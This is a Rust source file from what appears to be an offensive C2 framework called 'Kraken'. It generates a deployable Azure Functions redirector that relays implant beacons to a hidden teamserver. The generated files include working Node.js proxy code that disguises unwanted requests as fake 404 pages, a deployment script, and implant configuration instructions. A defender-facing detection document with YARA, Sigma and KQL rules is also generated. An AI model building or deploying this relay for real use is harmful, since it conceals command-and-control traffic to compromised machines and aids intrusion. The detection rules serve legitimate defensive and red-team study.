//! Azure Functions HTTP Trigger Redirector
//!
//! Generates Azure Functions deployment configuration for serverless-based
//! C2 traffic relay. This enables HTTP relay through Azure's global
//! infrastructure with HTTP trigger bindings.
//!
//! # Architecture
//!
//! ```text
//! Implant → Azure Functions → HTTP Trigger (relay) → Teamserver
//!           (public endpoint)  (filter+proxy)        (hidden backend)
//! ```
//!
//! # Detection Indicators
//! - Consistent requests to Azure Functions domain (.azurewebsites.net)
//! - POST requests to specific URI paths with encoded payloads
//! - Request patterns consistent with C2 beacon timing
//! - Unusual User-Agent patterns from Function App IPs
//!
//! # MITRE ATT&CK
//! - T1090.001 (Proxy: Proxy)
//! - T1071.001 (Application Layer Protocol: Web Protocols)

use anyhow::Result;
use clap::Args;
use serde::{Deserialize, Serialize};
use std::fs;
use std::path::Path;

/// Arguments for Azure Functions generation
#[derive(Debug, Args)]
pub struct AzureRedirectorArgs {
    /// Backend teamserver hostname
    #[arg(long, short = 'b')]
    pub backend_host: String,

    /// Backend teamserver port (default 8443)
    #[arg(long, default_value = "8443")]
    pub backend_port: u16,

    /// Azure Function App name (default "kraken-relay")
    #[arg(long, default_value = "kraken-relay")]
    pub function_app_name: String,

    /// Allowed URI paths (comma-separated, e.g., "/api/v1/beacon,/api/v1/task")
    #[arg(long, default_value = "/api/v1/beacon,/api/v1/task")]
    pub allowed_paths: String,

    /// Output directory for generated files
    #[arg(long, short = 'o', default_value = "./azure-function")]
    pub output_dir: String,

    /// Optional C2 profile path (for hardcoding allowed paths)
    #[arg(long)]
    pub profile_path: Option<String>,
}

/// Azure Functions configuration
#[derive(Debug, Serialize, Deserialize)]
pub struct FunctionConfig {
    pub bindings: Vec<Binding>,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct Binding {
    #[serde(rename = "authLevel")]
    pub auth_level: String,
    #[serde(rename = "type")]
    pub binding_type: String,
    pub direction: String,
    pub name: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub methods: Option<Vec<String>>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub route: Option<String>,
}

/// Generate Azure Functions deployment files
pub fn generate_azure_function(args: AzureRedirectorArgs) -> Result<()> {
    let output_path = Path::new(&args.output_dir);
    fs::create_dir_all(output_path)?;

    // Create relay subdirectory
    let relay_path = output_path.join("relay");
    fs::create_dir_all(&relay_path)?;

    // Generate function.json
    let function_config = generate_function_json(&args);
    fs::write(relay_path.join("function.json"), &function_config)?;

    // Generate index.js (Node.js function code)
    let function_code = generate_function_code(&args);
    fs::write(relay_path.join("index.js"), &function_code)?;

    // Generate host.json
    let host_config = generate_host_json();
    fs::write(output_path.join("host.json"), &host_config)?;

    // Generate local.settings.json
    let local_settings = generate_local_settings();
    fs::write(output_path.join("local.settings.json"), &local_settings)?;

    // Generate deploy.sh
    let deploy_script = generate_deploy_script(&args);
    fs::write(output_path.join("deploy.sh"), &deploy_script)?;

    // Generate package.json
    let package_json = generate_package_json(&args.function_app_name);
    fs::write(output_path.join("package.json"), &package_json)?;

    // Generate README.md
    let readme = generate_deployment_readme(&args);
    fs::write(output_path.join("README.md"), &readme)?;

    // Generate DETECTION.md
    let detection_doc = generate_detection_doc(&args);
    fs::write(output_path.join("DETECTION.md"), &detection_doc)?;

    println!("[+] Azure Functions files generated in: {}", args.output_dir);
    println!("    - relay/function.json  (Function binding config)");
    println!("    - relay/index.js       (Function code)");
    println!("    - host.json            (Host configuration)");
    println!("    - local.settings.json  (Local dev settings)");
    println!("    - package.json         (Dependencies)");
    println!("    - deploy.sh            (Deployment script)");
    println!("    - README.md            (Deployment guide)");
    println!("    - DETECTION.md         (Detection indicators)");
    println!();
    println!("[*] Deploy with:");
    println!("    cd {} && npm install && ./deploy.sh", args.output_dir);

    Ok(())
}

fn generate_function_json(_args: &AzureRedirectorArgs) -> String {
    r#"{
  "bindings": [
    {
      "authLevel": "anonymous",
      "type": "httpTrigger",
      "direction": "in",
      "name": "req",
      "methods": ["get", "post", "put"],
      "route": "{*path}"
    },
    {
      "type": "http",
      "direction": "out",
      "name": "$return"
    }
  ]
}
"#
    .to_string()
}

fn generate_function_code(args: &AzureRedirectorArgs) -> String {
    let allowed_paths: Vec<&str> = args.allowed_paths.split(',').map(|p| p.trim()).collect();
    let paths_json = serde_json::to_string(&allowed_paths).unwrap_or_else(|_| "[]".to_string());

    format!(
        r#"const https = require('https');
const http = require('http');

const BACKEND_HOST = '{}';
const BACKEND_PORT = {};
const ALLOWED_PATHS = {};

module.exports = async function (context, req) {{
    const path = req.params.path || '/';

    // Validate path is in allowed list
    if (!ALLOWED_PATHS.some(p => path.startsWith(p))) {{
        context.log(`[!] Invalid path: ${{path}}`);
        context.res = {{
            status: 200,
            body: '<html><head><title>404</title></head><body><h1>Not Found</h1></body></html>',
            headers: {{ 'Content-Type': 'text/html' }}
        }};
        return;
    }}

    // Build options for backend connection
    const options = {{
        hostname: BACKEND_HOST,
        port: BACKEND_PORT,
        path: '/' + path + (req.query.q ? '?q=' + req.query.q : ''),
        method: req.method,
        headers: {{
            ...req.headers,
            'Host': BACKEND_HOST,
            'X-Forwarded-For': req.headers['x-forwarded-for'] || req.ip
        }},
        rejectUnauthorized: false
    }};

    // Remove Azure-specific headers
    delete options.headers['host'];
    delete options.headers['x-forwarded-proto'];
    delete options.headers['x-forwarded-port'];

    return new Promise((resolve) => {{
        const protocol = BACKEND_PORT === 443 ? https : http;
        const proxy = protocol.request(options, (resp) => {{
            const chunks = [];

            resp.on('data', chunk => chunks.push(chunk));

            resp.on('end', () => {{
                context.log(`[+] Backend response: ${{resp.statusCode}} for ${{req.method}} /${{path}}`);

                // Forward response headers
                const headers = {{}};
                for (const [key, value] of Object.entries(resp.headers)) {{
                    // Skip hop-by-hop headers
                    if (!['connection', 'transfer-encoding', 'content-encoding'].includes(key.toLowerCase())) {{
                        headers[key] = value;
                    }}
                }}

                context.res = {{
                    status: resp.statusCode,
                    body: Buffer.concat(chunks),
                    headers: headers
                }};
                resolve();
            }});
        }});

        proxy.on('error', (err) => {{
            context.log.error(`[!] Backend connection error: ${{err.message}}`);
            context.res = {{
                status: 502,
                body: '<html><head><title>Bad Gateway</title></head><body><h1>502 Bad Gateway</h1></body></html>',
                headers: {{ 'Content-Type': 'text/html' }}
            }};
            resolve();
        }});

        proxy.on('timeout', () => {{
            context.log.error('[!] Backend connection timeout');
            proxy.destroy();
            context.res = {{
                status: 504,
                body: '<html><head><title>Gateway Timeout</title></head><body><h1>504 Gateway Timeout</h1></body></html>',
                headers: {{ 'Content-Type': 'text/html' }}
            }};
            resolve();
        }});

        // Send request body if present
        if (req.body) {{
            const bodyData = typeof req.body === 'string' ? req.body : JSON.stringify(req.body);
            proxy.write(bodyData);
        }}

        proxy.end();
    }});
}};
"#,
        args.backend_host, args.backend_port, paths_json
    )
}

fn generate_host_json() -> String {
    r#"{
  "version": "2.0",
  "logging": {
    "applicationInsights": {
      "samplingSettings": {
        "isEnabled": true,
        "maxTelemetryItemsPerSecond": 20
      }
    }
  },
  "extensionBundle": {
    "id": "Microsoft.Azure.Functions.ExtensionBundle",
    "version": "[4.*, 5.0.0)"
  },
  "functionTimeout": "00:05:00"
}
"#
    .to_string()
}

fn generate_local_settings() -> String {
    r#"{
  "IsEncrypted": false,
  "Values": {
    "AzureWebJobsStorage": "",
    "FUNCTIONS_WORKER_RUNTIME": "node",
    "FUNCTIONS_EXTENSION_VERSION": "~4"
  }
}
"#
    .to_string()
}

fn generate_deploy_script(args: &AzureRedirectorArgs) -> String {
    format!(
        r#"#!/bin/bash

# Kraken C2 Azure Functions Deployment Script
# Requires: Azure CLI (az), Node.js, npm

set -e

FUNCTION_APP_NAME="{}"
RESOURCE_GROUP="kraken-c2"
LOCATION="eastus"
RUNTIME_VERSION="node"

echo "[*] Creating resource group..."
az group create --name "$RESOURCE_GROUP" --location "$LOCATION" || true

echo "[*] Creating storage account..."
STORAGE_ACCOUNT="${{FUNCTION_APP_NAME}}storage"
az storage account create \
  --name "$STORAGE_ACCOUNT" \
  --resource-group "$RESOURCE_GROUP" \
  --location "$LOCATION" \
  --sku Standard_LRS || true

echo "[*] Creating Azure Functions app..."
az functionapp create \
  --resource-group "$RESOURCE_GROUP" \
  --consumption-plan-location "$LOCATION" \
  --runtime "$RUNTIME_VERSION" \
  --runtime-version 18 \
  --functions-version 4 \
  --name "$FUNCTION_APP_NAME" \
  --storage-account "$STORAGE_ACCOUNT" || true

echo "[*] Installing npm dependencies..."
npm install

echo "[*] Deploying function code..."
func azure functionapp publish "$FUNCTION_APP_NAME"

echo "[+] Deployment complete!"
echo "[*] Function URL: https://$FUNCTION_APP_NAME.azurewebsites.net/api/relay"
"#,
        args.function_app_name
    )
}

fn generate_package_json(name: &str) -> String {
    format!(
        r#"{{
  "name": "{}",
  "version": "1.0.0",
  "private": true,
  "description": "Kraken C2 Azure Functions HTTP Relay",
  "scripts": {{
    "start": "func start",
    "test": "echo \"No tests specified\""
  }},
  "dependencies": {{}},
  "devDependencies": {{
    "azure-functions-core-tools": "^4.0.0"
  }}
}}
"#,
        name
    )
}

fn generate_deployment_readme(args: &AzureRedirectorArgs) -> String {
    format!(
        r#"# Kraken Azure Functions HTTP Relay

Serverless HTTP relay for C2 traffic using Azure Functions.

## Prerequisites

1. Azure subscription
2. Azure CLI: `curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash`
3. Node.js 18+: `node --version`
4. Azure Functions Core Tools: `npm install -g azure-functions-core-tools@4`
5. Authenticated with Azure: `az login`

## Configuration

The function is pre-configured with:
- **Backend Host**: `{}`
- **Backend Port**: `{}`
- **Allowed Paths**: `{}`

To modify, edit `relay/index.js` and change:
```javascript
const BACKEND_HOST = '{}';
const BACKEND_PORT = {};
const ALLOWED_PATHS = {};
```

## Local Testing

```bash
# Install dependencies
npm install

# Start function locally
func start

# In another terminal, test the relay:
curl -X POST http://localhost:7071/api/relay/api/v1/beacon \
  -d "test payload" \
  -H "Content-Type: application/octet-stream"
```

## Deployment

```bash
# Deploy using Azure Functions Core Tools
func azure functionapp publish {}

# OR use the deployment script
chmod +x deploy.sh
./deploy.sh
```

## Implant Configuration

Configure implant to:
1. Backend URL: `https://{}.azurewebsites.net/api/relay`
2. Allowed paths: `/api/v1/beacon`, `/api/v1/task`
3. Use standard HTTPS (port 443)

Example:
```
# In implant config
c2_profile={{
  protocol: "https",
  host: "{}.azurewebsites.net",
  path: "/api/v1/beacon",
  port: 443,
  beacon_interval: 5000
}}
```

## Monitoring

View function logs:
```bash
# Stream logs in real-time
func azure functionapp logstream {} --build remote

# OR via Azure Portal
az webapp log tail --resource-group kraken-c2 --name {}
```

## Security Considerations

- Function runs with anonymous auth level (edit function.json to change)
- No request validation (add header checks if needed)
- HTTPS enforced by Azure (configurable in Function App settings)
- Consider adding IP allowlisting at network level

## Cost Estimation

Azure Functions consumption plan pricing:
- First 1M requests/month: FREE
- Beyond: ~$0.20 per million requests
- Data transfer: standard Azure egress rates

## Cleanup

Remove all resources:
```bash
az group delete --name kraken-c2 --yes
```

## Detection

See `DETECTION.md` for indicators defenders can use to identify this traffic.
"#,
        args.backend_host,
        args.backend_port,
        args.allowed_paths,
        args.backend_host,
        args.backend_port,
        args.allowed_paths,
        args.function_app_name,
        args.function_app_name,
        args.function_app_name,
        args.function_app_name,
        args.function_app_name
    )
}

fn generate_detection_doc(_args: &AzureRedirectorArgs) -> String {
    format!(
        r#"# Detection Indicators for Azure Functions HTTP Relay

This document provides detection guidance for defenders.

## MITRE ATT&CK

- **T1090.001**: Proxy: Proxy
- **T1071.001**: Application Layer Protocol: Web Protocols
- **T1572**: Protocol Tunneling

## Network Indicators

### Azure Functions Domain Patterns

Traffic originates from Azure Functions hostnames:
- `*.azurewebsites.net` (public endpoints)
- `*.cloudapp.azure.com` (alternate domain)

### Request Patterns

| Indicator | Description |
|-----------|-------------|
| Consistent timing | Regular beacon intervals (jittered but patterned) |
| POST to paths | `/api/v1/beacon`, `/api/v1/task` |
| Specific User-Agent | Static or unusual UA string |
| Encoded body | Custom encoding in POST body |
| HTTPS port 443 | Standard HTTPS to Function App |

### Azure Infrastructure Fingerprints

- Source IPs from Microsoft Azure IP ranges
- TLS certificates issued for `*.azurewebsites.net` domains
- HTTP headers: `X-Original-Host`, `X-Forwarded-*`

## Endpoint Indicators

- Process making HTTPS requests to `*.azurewebsites.net`
- Consistent outbound connections on :443
- DNS resolution to Azure CDN CNAME records

## Log Analysis

### Azure Function Logs

Monitor Application Insights or Log Analytics:
```kusto
FunctionAppLogs
| where TimeGenerated > ago(1h)
| where ResultCode >= 400
| summarize Count=count() by Path, ResultCode
```

### Firewall Logs

- Outbound 443 to Azure Functions IP ranges
- Connections to specific Function App FQDN
- Request patterns with static/unusual User-Agent

## YARA Rules

```yara
rule Azure_Functions_C2_Relay {{
    meta:
        description = "Detects Azure Functions C2 relay calls"
        mitre = "T1090.001"

    strings:
        $domain = "azurewebsites.net" ascii wide
        $path1 = "/api/v1/beacon" ascii wide
        $path2 = "/api/v1/task" ascii wide
        $relay = "/api/relay" ascii wide

    condition:
        $domain and 2 of ($path*, $relay)
}}
```

## Sigma Rules

```yaml
title: Azure Functions C2 Communication
status: experimental
logsource:
    category: proxy
    product: azure
detection:
    selection:
        cs-host|endswith: '.azurewebsites.net'
        cs-method: 'POST'
        cs-uri-path|contains: '/api/'
    condition: selection
level: medium
```

## Behavioral Indicators

1. **Beacon Timing**: Regular POST requests with consistent intervals (minus jitter)
2. **Data Exfiltration**: Small POST bodies (~100-1000 bytes) followed by larger responses
3. **C2 Command Pattern**: Regular request/response cycles with command execution timing
4. **No User Interaction**: Outbound traffic without corresponding user browsing

## Mitigation Recommendations

1. **Block Azure endpoints** if not required for business
2. **Inspect POST bodies** for suspicious encoding/binary data
3. **Monitor beacon patterns** with statistical analysis
4. **Alert on**: Successful connections from internal hosts to new Azure Functions apps
5. **Implement**: Conditional Access policies to restrict Azure Functions usage
6. **Segment network**: Egress filtering for cloud service domains

## Azure-Specific Mitigations

- Enable Azure DDoS Protection on public endpoints
- Restrict Function App to Azure Virtual Network
- Use Managed Identity for authentication instead of anonymous
- Enable Azure Application Gateway WAF rules
- Monitor cost anomalies (sudden spike in function invocations)

## Hunting Queries

### Log Analytics (Azure Monitor)

**Find suspicious Function App traffic:**
```kusto
AzureDiagnostics
| where ResourceProvider == "MICROSOFT.WEB"
| where Category == "FunctionAppLogs"
| where ResultCode >= 400
| summarize RequestCount=count(), UniqueIPs=dcount(ClientIP) by bin(TimeGenerated, 5m), Path
| where RequestCount > 10
```

**Detect unusual request timing:**
```kusto
AzureDiagnostics
| where ResourceType == "sites/functions"
| where TimeGenerated > ago(24h)
| project TimeGenerated, Path=tostring(parse_url(Url).Path)
| summarize IntervalSeconds=avg(datetime_diff("second", TimeGenerated, prev(TimeGenerated))) by Path
| where IntervalSeconds between(4000, 6000)  // Typical 5-6s beacon
```

## References

- Microsoft Azure IP Ranges: https://www.microsoft.com/en-us/download/details.aspx?id=56519
- Azure Functions Security: https://learn.microsoft.com/azure/azure-functions/security-concepts
"#
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_default_args() {
        let args = AzureRedirectorArgs {
            backend_host: "ts.example.com".into(),
            backend_port: 8443,
            function_app_name: "kraken-relay".into(),
            allowed_paths: "/api/v1/beacon,/api/v1/task".into(),
            output_dir: "/tmp/test".into(),
            profile_path: None,
        };

        assert_eq!(args.backend_port, 8443);
        assert_eq!(args.function_app_name, "kraken-relay");
    }

    #[test]
    fn test_function_json_generation() {
        let args = AzureRedirectorArgs {
            backend_host: "ts.example.com".into(),
            backend_port: 8443,
            function_app_name: "kraken-relay".into(),
            allowed_paths: "/api/v1/beacon".into(),
            output_dir: "/tmp/test".into(),
            profile_path: None,
        };

        let config = generate_function_json(&args);
        assert!(config.contains("httpTrigger"));
        assert!(config.contains("anonymous"));
        assert!(config.contains("{*path}"));
    }

    #[test]
    fn test_function_code_generation() {
        let args = AzureRedirectorArgs {
            backend_host: "ts.example.com".into(),
            backend_port: 8443,
            function_app_name: "kraken-relay".into(),
            allowed_paths: "/api/v1/beacon,/api/v1/task".into(),
            output_dir: "/tmp/test".into(),
            profile_path: None,
        };

        let code = generate_function_code(&args);
        assert!(code.contains("BACKEND_HOST"));
        assert!(code.contains("BACKEND_PORT"));
        assert!(code.contains("ALLOWED_PATHS"));
        assert!(code.contains("protocol.request"));
        assert!(code.contains("ts.example.com"));
        assert!(code.contains("8443"));
    }

    #[test]
    fn test_host_json_generation() {
        let config = generate_host_json();
        assert!(config.contains("version"));
        assert!(config.contains("logging"));
        assert!(config.contains("extensionBundle"));
    }

    #[test]
    fn test_package_json_generation() {
        let pkg = generate_package_json("test-relay");
        assert!(pkg.contains("test-relay"));
        assert!(pkg.contains("azure-functions-core-tools"));
    }

    #[test]
    fn test_deploy_script_generation() {
        let args = AzureRedirectorArgs {
            backend_host: "ts.example.com".into(),
            backend_port: 8443,
            function_app_name: "kraken-relay".into(),
            allowed_paths: "/api/v1/beacon".into(),
            output_dir: "/tmp/test".into(),
            profile_path: None,
        };

        let script = generate_deploy_script(&args);
        assert!(script.contains("kraken-relay"));
        assert!(script.contains("az functionapp create"));
        assert!(script.contains("func azure functionapp publish"));
    }

    #[test]
    fn test_readme_generation() {
        let args = AzureRedirectorArgs {
            backend_host: "ts.example.com".into(),
            backend_port: 8443,
            function_app_name: "kraken-relay".into(),
            allowed_paths: "/api/v1/beacon,/api/v1/task".into(),
            output_dir: "/tmp/test".into(),
            profile_path: None,
        };

        let readme = generate_deployment_readme(&args);
        assert!(readme.contains("Azure Functions"));
        assert!(readme.contains("kraken-relay"));
        assert!(readme.contains("ts.example.com"));
    }

    #[test]
    fn test_detection_doc_generation() {
        let args = AzureRedirectorArgs {
            backend_host: "ts.example.com".into(),
            backend_port: 8443,
            function_app_name: "kraken-relay".into(),
            allowed_paths: "/api/v1/beacon".into(),
            output_dir: "/tmp/test".into(),
            profile_path: None,
        };

        let doc = generate_detection_doc(&args);
        assert!(doc.contains("MITRE ATT&CK"));
        assert!(doc.contains("azurewebsites.net"));
        assert!(doc.contains("T1090.001"));
    }
}
